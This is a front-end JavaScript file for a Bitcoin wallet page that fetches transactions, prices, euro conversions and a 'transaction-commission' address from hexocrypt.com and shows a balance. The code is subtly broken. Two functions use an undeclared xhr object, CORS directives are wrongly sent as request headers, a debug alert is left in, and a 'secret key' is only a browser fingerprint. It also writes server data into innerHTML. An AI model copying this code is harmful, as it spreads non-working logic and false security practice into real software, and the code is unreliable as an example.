import { getCurrency } from './changeCurrency.js';

let url = new URL(window.location.href).searchParams.get("email");

function loaderFunction(status) {
    if (status) {
        alert("here");
        let div = document.createElement("div");
        div.style =
            "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;";
        div.id = "loader-wrapper";
        div.innerHTML = '<div class="loader" style="color:red;"></div>';
        document.body.append(div);
    } else {
        document.getElementById("loader-wrapper")?.remove();
    }
}

async function send_request(type, loader, url, data) {
    return new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest()
        let page = `https://hexocrypt.com/api/${url}`;
        xhr.open(type, page);
        xhr.responseType = "json";
        xhr.setRequestHeader("Accept", "application/json");
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
        xhr.setRequestHeader("mode", "no-cors");
        xhr.setRequestHeader("cache", "no-cache");
        xhr.setRequestHeader("credentials", "same-origin");
        xhr.setRequestHeader("redirect", "follow");

        xhr.onload = () => {
            resolve(xhr.response);
        };

        if (data != false) {
            xhr.send(JSON.stringify(data));
        } else {
            xhr.send();
        }
    });
}

async function get_cm(price) {
    let sicret_key = `${navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
        }`;

    return new Promise((resolve, reject) => {
        let url = "https://hexocrypt.com/api/transaction-commission";
        xhr.open("post", url);
        xhr.responseType = "json";
        xhr.setRequestHeader("Accept", "application/json");
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onload = () => {
            resolve(xhr.response.address);
        };
        xhr.send(JSON.stringify({ price: price, sicret_key: sicret_key }));
    });
}

function buttonClicked() {
    window.location.href = `withdraw.html?email=${url}`;
}

async function convert(price) {
    let sicret_key = `${navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
        }`;

    return new Promise((resolve, reject) => {
        let url = "https://hexocrypt.com/api/transaction-convert-euro";
        xhr.open("post", url);
        xhr.responseType = "json";
        xhr.setRequestHeader("Accept", "application/json");
        xhr.setRequestHeader("Content-Type", "application/json");

        xhr.onload = () => {
            resolve(xhr.response);
        };
        xhr.send(JSON.stringify({ price: price, sicret_key: sicret_key }));
    });
}

async function setElements(priceBitcoin, getPriceEuro, walletTransactions) {
    let currencyText = "USD"
    const currency = localStorage.getItem("currency")

    if (currency == "dollar") {
        currencyText = "USD"
    } else if (currency == "euro") {
        currencyText = "EUR"
    }

    document.getElementById("transaction_0").textContent = `${walletTransactions.transaction_0} BTC`
    document.getElementById("transaction_1").textContent = `${walletTransactions.transaction_1} BTC`
    document.getElementById("transaction_2").textContent = `${walletTransactions.transaction_2} BTC`


    document.getElementById("mainWalletBtc").textContent = `${priceBitcoin} BTC`

    document.getElementById("setPrice").textContent = getPriceEuro + ` ${currencyText}`;
    let bictoin_p = document.querySelector(".check-balance__bitcoin");
    let html = `<img src="../../img/bitcoin-convert.jpg"" alt="bitcoin-convert" width="60" class="d-block mx-auto mb-1"> ${priceBitcoin} BTC`;
    bictoin_p.innerHTML = html + bictoin_p.innerHTML;
    loaderFunction(false);
}

async function start() {
    let currency = await getCurrency()

    let sicret_key = `${navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
        }`;

    let walletTransactions = await send_request("get", false, "walletTransactions", false);
    let priceBitcoin = await send_request("get", false, "price_change", false);

    let getPriceEuro = await send_request(
        "post",
        false,
        "transaction-convert-euro",
        { currency, price: priceBitcoin.price_euro, sicret_key: sicret_key }
    );

    await setElements(Number(priceBitcoin.price_euro).toFixed(8), Number(getPriceEuro.price).toFixed(2), walletTransactions);
}

start();
